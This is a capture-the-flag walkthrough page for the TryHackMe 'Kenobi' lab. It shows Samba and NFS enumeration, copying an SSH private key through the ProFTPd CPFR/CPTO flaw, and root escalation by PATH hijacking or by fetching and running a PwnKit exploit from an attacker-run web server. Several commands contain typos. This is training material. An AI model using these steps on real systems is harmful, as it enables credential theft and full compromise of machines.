<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:title" content="Kenobi"><meta property="og:description" content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/tryhackme/Kenobi/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><title>Kenobi | Notes</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png><link rel=canonical href=http://localhost:1313/posts/tryhackme/Kenobi/><link rel=stylesheet href=/book.min.ac21c8af3949149e40b4b734505156d2f4275906589cacc78b77ca28e8eee72d.css integrity="sha256-rCHIrzlJFJ5AtLc0UFFW0vQnWQZYnKzHi3fKKOju5y0=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.c01d497d2aa93ce552c5b04f396b072626c28bf84ad582a961770782dc24c057.js integrity="sha256-wB1JfSqpPOVSxbBPOWsHJibCi/hK1YKpYXcHgtwkwFc=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Tryhackme</a></label><ul><li><a href=/docs/tryhackme/Vulnversity/>Vulnversity</a></li><li><a href=/docs/tryhackme/Blue/>Blue</a></li><li><a href=/docs/tryhackme/Kenobi/>Kenobi</a></li><li><a href=/docs/tryhackme/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/tryhackme/Alfred/>Alfred</a></li><li><a href=/docs/tryhackme/HackPark/>Hack Park</a></li><li><a href=/docs/tryhackme/DailyBugle/>Daily Bugle</a></li></ul></li><li><input type=checkbox id=section-d03949e4a854df2320014bae25b6f4d6 class=toggle>
<label for=section-d03949e4a854df2320014bae25b6f4d6 class="flex justify-between"><a role=button>Hackthebox</a></label><ul><li><a href=/docs/hackthebox/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Kenobi</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#approach-1>Approach 1</a></li><li><a href=#approach-2>Approach 2</a></li></ul></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/tryhackme/Kenobi/>Kenobi</a></h1><h5>May 23, 2023</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/Scanning/>Scanning</a>,
<a href=/tags/Exploitation/>Exploitation</a>,
<a href=/tags/Enumeration/>Enumeration</a>,
<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><p>Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.</p><h2 id=scanning>Scanning
<a class=anchor href=#scanning>#</a></h2><p>First we will deploy the machine and scan the target using rustscan.</p><h2 id=enumeration>Enumeration
<a class=anchor href=#enumeration>#</a></h2><p>We can see that there is Samba file server running, so let&rsquo;s find the available shares.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>smbclient -L 10.10.74.95
</span></span></code></pre></div><p>We will now connect to the anonymous share.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>smbclient <span style=color:#ae81ff>\\\\</span>10.10.74.95<span style=color:#ae81ff>\\</span>anonymous
</span></span></code></pre></div><p>When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.</p><p>On the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let&rsquo;s enumerate for nfs shares and from the mount information we can see the mount /var.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nmap -p <span style=color:#ae81ff>111</span> -script<span style=color:#f92672>=</span>nfs-ls,nfs-statfs,nfs-showmount10.10.74.95
</span></span></code></pre></div><p>We saw there is a ftp service running on port 21. Let&rsquo;s try to grab the banner of ftp to find the ftp version using netcat.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc 10.10.74.95 <span style=color:#ae81ff>21</span>
</span></span></code></pre></div><p>We will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>searchsploit proftpd 1.3.5
</span></span></code></pre></div><p>While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.</p><h2 id=exploitation>Exploitation
<a class=anchor href=#exploitation>#</a></h2><p>Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.</p><p>Let&rsquo;s connect to ftp and copy the files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc 10.10.74.95 <span style=color:#ae81ff>21</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>SITE CPFR /home/kenobi/.ssh/id_rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>SITE CPTO /var/tmp/id_rsa
</span></span></code></pre></div><p>Now we will mount the /var directory to our machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mkdir /mnt/kenobi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mount 10.10.74.95:/var /mnt/kenobi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cd /mnt/kenobi
</span></span></code></pre></div><p>We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ssh kenobi@10.10.74.95 -i id rsa
</span></span></code></pre></div><p>We&rsquo;re logged in as kenobi and we can read the user flag.</p><h2 id=privilege-escalation>Privilege Escalation
<a class=anchor href=#privilege-escalation>#</a></h2><h3 id=approach-1>Approach 1
<a class=anchor href=#approach-1>#</a></h3><p>We will find the files with SUID bit set.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>find / -perm -u<span style=color:#f92672>=</span>s - type f 2&gt;/dev/null
</span></span></code></pre></div><p>/usr/bin/menu seems to be unusual among the list of file that we got.</p><p>When we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.</p><p>When we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.</p><p>We got the root shell!!!</p><h3 id=approach-2>Approach 2
<a class=anchor href=#approach-2>#</a></h3><p>Start the python http server and download linpeas.sh to the target machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server <span style=color:#ae81ff>1111</span>
</span></span></code></pre></div><blockquote><p>On target machine</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wet http: //10.6.29.149:1111/linpeas.sh
</span></span></code></pre></div><p>Change the file permissions to executable and run the file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>chmod +x linpeas.sh
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>./linpeas.sh
</span></span></code></pre></div><p>We can see that the target machine is vulnerable to CVE-2021-4034.</p><p>Clone the repo into your machine.</p><pre tabindex=0><code>https://github.com/ryaagard/CVE-2021-4034.git
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cd CVE-2021-4034
</span></span></code></pre></div><p>Start the python server again to server the files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server <span style=color:#ae81ff>1111</span>
</span></span></code></pre></div><p>On target machine create a folder and download all the files to the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wet http://10.6.29.149:1111/evil.so
</span></span></code></pre></div><pre tabindex=0><code>wget http://10.6.29.149:1111/evil-so.c
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wget http://10.6.29.149:1111/exploit.c
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wget http://10.6.29.149:1111/Makefile
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wget http://10.6.29.149:1111/README.md
</span></span></code></pre></div><p>Run the make file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>make
</span></span></code></pre></div><p>Execute exploit.sh.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>./exploit.sh
</span></span></code></pre></div><p>We got the root shell!!!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#approach-1>Approach 1</a></li><li><a href=#approach-2>Approach 2</a></li></ul></li></ul></li></ul></nav></div></aside></main></body></html>